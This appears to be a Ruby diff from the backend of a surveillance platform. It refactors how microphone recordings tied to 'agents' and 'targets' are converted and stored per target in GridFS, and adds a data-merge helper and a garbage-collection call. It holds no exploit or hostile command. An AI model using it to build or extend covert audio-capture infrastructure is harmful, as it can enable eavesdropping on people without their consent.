@@ -1,5 +1,4 @@
 require 'ffi'
-require 'mongo'
 require 'mongoid'
 require 'stringio'
 
@@ -55,6 +54,10 @@ module Worker
       @evidence.update_attributes(hash) unless @evidence.nil?
     end
 
+    def update_data(hash)
+      @evidence.update_attributes(data: @evidence.data.merge!(hash)) unless @evidence.nil?
+    end
+
     def store(acquired, agent, target)
       coll = ::Evidence.target(target[:_id].to_s)
       coll.create do |ev|
@@ -100,6 +103,10 @@ module Worker
         end
       end
 
+      # explicitly invoke the Garbage Collector to free some RAM
+      # the wav allocated in memory could consume many resources
+      GC.start
+
       return @mic.bid, @mic.raw_counter
     end
 
@@ -114,14 +121,10 @@ module Worker
     end
 
     def write_to_grid(mic, mp3_bytes, target, agent)
-      db = RCS::DB::DB.instance.mongo_connection
-      fs = Mongo::GridFileSystem.new(db, "grid.#{target[:_id]}")
-
-      fs.open(mic.file_name, 'a') do |f|
-        f.write mp3_bytes
-        mic.update_attributes({data: {_grid: Moped::BSON::ObjectId.from_string(f.files_id.to_s), _grid_size: f.file_length, duration: mic.duration}})
-      end
-      agent.stat.size += mp3_bytes.size
+      collection = "grid.#{target[:_id]}"
+      file_id, file_length = *RCS::DB::GridFS.append(mic.file_name, mp3_bytes, collection)
+      mic.update_data(_grid: Moped::BSON::ObjectId.from_string(file_id.to_s), _grid_size: file_length, duration: mic.duration)
+      agent.stat.size += mp3_bytes.bytesize
       agent.save
     end
   end
